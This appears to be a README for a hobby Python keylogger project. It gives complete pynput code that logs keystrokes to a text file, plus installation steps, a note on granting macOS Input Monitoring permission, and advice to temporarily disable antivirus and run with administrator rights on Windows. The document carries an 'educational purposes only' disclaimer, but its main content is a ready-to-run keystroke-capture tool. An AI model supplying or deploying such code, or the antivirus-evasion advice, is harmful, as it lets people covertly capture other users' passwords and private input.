# Keylogger Project

## 📌 Overview
This project is a simple **keylogger** implemented in Python using the `pynput` library. A keylogger is a program that records every key pressed on a keyboard and stores it in a text file. While keyloggers have legitimate uses (e.g., monitoring self-inputs or debugging), they can also be **misused for malicious purposes**, making them potentially dangerous.

---

## ⚠️ Disclaimer
**This script is for educational purposes only.** Unauthorized use of keyloggers to capture keystrokes without consent may violate laws and ethical guidelines.

---

## 🔧 Setup Instructions
### 1️⃣ Install Python
Ensure you have **Python 3.7+** installed. You can check your Python version by running:
```sh
python3 --version
```
If Python is not installed, install it via Homebrew (Mac) or from [Python's official website](https://www.python.org/downloads/).
```sh
brew install python
```

### 2️⃣ Create a Virtual Environment
It is recommended to use a **virtual environment** to keep dependencies isolated.
```sh
python3 -m venv venv
source venv/bin/activate  # For macOS/Linux
```
```sh
venv\Scripts\activate    # For Windows
```

### 3️⃣ Install Dependencies
```sh
pip install pynput
```

### 4️⃣ Run the Keylogger
Save the following Python code as `keylogger.py`:
```python
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(str(char))
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
```
Run the script:
```sh
python keylogger.py
```

---

## 📂 How It Works
- When you **run** this script, it starts listening for keystrokes.
- Every key pressed is **recorded** and stored in `keyfile.txt`.
- The script runs in the background, continuously logging all input.

> **Warning:** This script captures all user input, which can include **passwords and sensitive information**. Always use it responsibly.

---

## 🚨 Security Considerations
### 🔹 MacOS Users
You may need to enable **Input Monitoring** to allow the script to capture keystrokes:
1. Open **System Preferences** → **Privacy & Security**
2. Go to **Input Monitoring** and grant permissions to **Terminal (or Python)**.

### 🔹 Windows Users
Some antivirus software may block or flag this script. To run it:
1. Temporarily **disable** antivirus detection (if necessary).
2. Run the script with administrator privileges (if needed).

---

## ❌ How to Stop the Keylogger
To **terminate** the keylogger, press:
- `CTRL + C` in the terminal (for Windows/macOS/Linux).
- Close the terminal window.

---

## 🔚 Conclusion
This project serves as a simple demonstration of how keyloggers work and why they can be dangerous if misused. Use this knowledge **ethically and legally**, ensuring you have explicit consent when running keyloggers on any system.

**Happy Coding! 🚀**
